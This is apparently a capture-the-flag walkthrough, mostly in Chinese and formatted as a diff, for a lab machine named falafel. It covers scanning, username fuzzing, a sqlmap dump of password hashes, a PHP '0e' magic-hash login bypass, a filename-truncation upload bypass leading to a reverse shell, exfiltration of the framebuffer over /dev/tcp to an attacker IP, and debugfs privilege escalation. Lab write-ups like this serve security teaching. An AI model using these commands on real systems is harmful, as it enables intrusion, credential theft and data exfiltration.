@@ -1,0 +1,55 @@
+nmap -sV -sC -Pn 10.129.1.83  > nmap.txt
+gobuster dir  -u http://10.129.1.83/ -w /usr/share/dirb/wordlists/common.txt  -x txt,php -t50 > gobuster.txt
+gobuster dir  -u http://10.129.1.83/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x txt,php  > gobustermed.txt
+
+
+
+
+1.nmap掃描到80端口gobuster找到cyberlaw.txt
+2.在login頁面可以驗證用戶名是否有效
+wfuzz -c -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.129.1.83/login.php
+3.確認有效用戶名為admin,chris
+4.將登入請求存為log.req
+sqlmap -r log.req --level 5 --risk 3 --batch
+
+sqlmap -r log.req --level 5 --risk 3 --batch --string "Wrong identification" --dbms=mysql
+sqlmap -r log.req --level 5 --risk 3 --batch --string "Wrong identification" --dbms=mysql --dump
++----+--------+---------------------------------------------+----------+
+| ID | role   | password                                    | username |
++----+--------+---------------------------------------------+----------+
+| 1  | admin  | 0e462096931906507119562988736854            | admin    |
+| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |
++----+--------+---------------------------------------------+----------+
+5.根據php 0e collision, php代碼中使用==判斷字符串的話會將第一字當作數字判斷,所以傳入特定hash是0e開頭的密碼,可以繞過驗證
+
+    $ echo -n 240610708 | md5sum
+    0e462097431906509019562988736854  -
+    $ echo -n QNKCDZO | md5sum
+    0e830400451993494058024219903391  -
+    $ echo -n aabg7XSs | md5sum
+    0e087386482136013740957780965295  -
+
+6.在admin profile頁面找到maxium,嘗試上傳最長255長度檔案,發現236長度之後的字會被截斷
+7.上傳AAAA.php.png  可以繞過前端驗證.png檔案後,保存在路徑上只剩AAAAA.php,
+8.在頁面上可以看到訊息路徑訊息
+<pre>CMD: cd /var/www/html/uploads/0727-1725_134cadf9ce7d238f;
+9.訪問以下路徑取得reverse shell
+10.129.1.83/uploads/0727-1725_134cadf9ce7d238f/AAAAAAAAAAAAAAAA
+11.在var/www/html下找到connection.php
+12.透過moshe可ssh登入
+13.發現有video群組
+14.將檔案回傳到本地
+cat /dev/fb0  > /dev/tcp/10.10.14.35/4444
+15.在該路徑下可查到看到解析度
+-rw-r--r-- 1 root root 4096 Jul 27 18:00 virtual_size
+moshe@falafel:/sys/class/graphics/fb0$ cat bits_per_pixel
+32
+moshe@falafel:/sys/class/graphics/fb0$ cat mode
+moshe@falafel:/sys/class/graphics/fb0$ cat virtual_size
+1176,885
+moshe@falafel:/sys/class/graphics/fb0$
+
+
+MoshePlzStopHackingMe!
+15.id查看到yossi是disk群組用戶,'/sbin/debugfs'有該指令權限
+/sbin/debugfs sda1
